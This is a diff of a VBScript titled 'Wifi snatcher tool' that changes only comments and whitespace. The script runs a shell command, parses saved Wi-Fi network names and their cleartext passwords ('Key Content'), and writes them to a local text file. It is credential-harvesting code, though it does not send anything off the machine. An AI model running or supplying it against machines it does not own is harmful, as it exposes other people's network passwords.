@@ -1,4 +1,4 @@
-'Wifi details snatcher tool
+' Wifi snatcher tool
 Option Explicit
 
 Dim objShell,objFso,objExec,objFile
@@ -7,7 +7,7 @@ Dim wifiName, wifiPassword,command,strOutput,strLine
 
 ' Create a shell object
 Set objShell = CreateObject("WScript.Shell")
-'Create Fso object
+' Create Fso object
 Set objFso = CreateObject("Scripting.FileSystemObject")
 ' Create file object
 Set objFile =objFso.CreateTextFile("WifiDetails.txt",True)
@@ -20,33 +20,29 @@ objFile.Writeline "                                   -TEdtr    "
 
 ' Read the output from the command
 strOutput = ""
+
 Do While Not objExec.StdOut.AtEndOfStream
     strLine = objExec.StdOut.ReadLine()
     strOutput = strOutput & strLine & vbCrLf
 
 
-    If InStr(strLine, "SSID name")>0  Then
+       If InStr(strLine, "SSID name")>0  Then
         ' Extract the Wi-Fi name
         wifiName = Trim(Split(strLine, ":")(1))
     
-     ' Output the Wi-Fi name and password
+        ' Output the Wi-Fi name and password
         objFile.Writeline "--------------------------------------------"
         objFile.Writeline "Wi-Fi Name: " & wifiName
-   End If
+       End If
 
         If InStr(strLine, "Key Content") > 0 Then
-        ' Extract the Wi-Fi password
-        wifiPassword = Trim(Split(strLine, ":")(1)) 
-        objFile.Writeline "Password: " & wifiPassword     
+         ' Extract the Wi-Fi password
+         wifiPassword = Trim(Split(strLine, ":")(1)) 
+         objFile.Writeline "Password: " & wifiPassword     
         End If
 
-
+        
 Loop
-
-
-
-
- 
 
 ' Clean up
 Set objShell = Nothing
